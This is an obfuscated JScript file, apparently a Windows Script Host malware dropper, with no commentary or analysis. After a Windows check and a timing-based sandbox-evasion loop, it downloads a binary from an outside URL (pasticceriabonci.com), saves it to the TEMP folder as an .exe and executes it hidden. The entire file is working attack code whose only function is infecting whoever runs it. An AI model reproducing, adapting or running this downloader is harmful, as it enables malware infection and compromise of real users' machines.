var F0 = false;
var rW = "CreateObject";
var A = function mC() {return WScript[rW]("WScript.Shell");}(), KA = 11;
var XF = "MSXML2.XMLHTTP";
var R = 2123213;
var Xi = 0;
function U(PW){A["Run"](PW, Xi, Xi);};
function vP(){return "" + XF;};
function v(GS, Jc){Xi = Xi * 1; return GS - Jc;};
function X(){return rW;};
/*@cc_on
  @if (@_win32 || @_win64)
    F0 = true;
  @end
@*/
if (F0)
{
var Xp = "";
function Ms(){return 22;};
var I = 0; var F = 0;
function J()
{
var FA = new this["Date"]();
var Nw = FA["getUTCMilliseconds"]();
WScript["Sleep"](Ms());
var FA = new this["Date"]();
var UL = FA["getUTCMilliseconds"]();
WScript["Sleep"](Ms());
var FA = new this["Date"]();
var P = FA["getUTCMilliseconds"]();
var I = "x";
I = v(UL, Nw);
var F = "mu";
F = v(P, UL);
Xp = "open";
return v(I, F);
}
var BU = false;
var s = false;
for (var Wu = Xi; Wu < Ms() * 1; Wu++){if (J() != Xi){
BU = true; 
F = "31" + 11 * I + F; 
s = true; 
break;
}}
function cG() {return ((BU == true) && (BU == s)) ? 1 : Xi;};
if (BU && cG() && s){
function xQ() {return A["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "daJKLF6JbySr3u.exe";};
 HZ = vP();
 Gu = WScript[rW](HZ);
 var nq = 1;
 while (nq){
try {
Gu[Xp]("GET", "http://pasticceriabonci.com/n4usj", false);
Gu["send"]();
hw = "Sleep";
for (;;){WScript[hw](Ms() * 11); if (Gu["readystate"] >= 2 * 2) break;};
nq = Xi;
} catch(Q){};
}
function g(WO) {var w = (1, 2, 3, 4, 5, WO); return w;};
t = WScript[X()]("ADODB.Stream");
HZ = t;
HZ[Xp]();
HZ["type"] = g(1);
HZ["write"](Gu["ResponseBody"]);
t["position"] = g(Xi);
HZ["Save" + "ToFile"](xQ(), 2);
t["c"+"lose"]();
lQ = xQ();
U(lQ);
}
}

